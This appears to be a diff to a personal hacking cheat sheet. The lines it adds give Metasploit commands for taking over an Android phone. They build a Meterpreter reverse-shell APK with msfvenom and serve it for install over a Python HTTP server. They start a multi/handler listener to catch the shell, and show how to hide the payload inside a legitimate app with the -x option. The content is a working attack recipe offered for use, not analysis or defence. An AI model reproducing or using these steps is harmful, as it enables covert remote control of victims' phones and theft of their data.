@@ -19,9 +19,25 @@ Once you open the installed apk on phone you'll get the interactive session of t
 
 
 
---Android Hacking using msfvenom & metasploit--
+--Android Hacking using msfvenom & metasploit (Malicious apk)--
 
 > msfvenom -p android/meterpreter/reverse_tcp LHOST local_machine_ip LPORT 4444 R> test.apk
+> python3 -m http.server (now open chrome in your android phone & search attack_machine_ip:port and install the apk)
+open another terminal
+> msfconsole
+> msf6 use multi/handler
+> msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+> msf6 exploit(multi/handler) > set LHOST attack_machine_ip
+> msf6 exploit(multi/handler) > set LPORT 4444
+> msf6 exploit(multi/handler) > exploit
+open the apk app on the phone to recieve the interactive shell
+
+
+
+
+--Android Hacking using msfvenom & metasploit (Malicious with legit apk)--
+
+> msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST local_machine_ip LPORT 4444 R> test.apk
 > python3 -m http.server (now open chrome in your android phone & search attack_machine_ip:port and install the apk)
 open another terminal
 > msfconsole
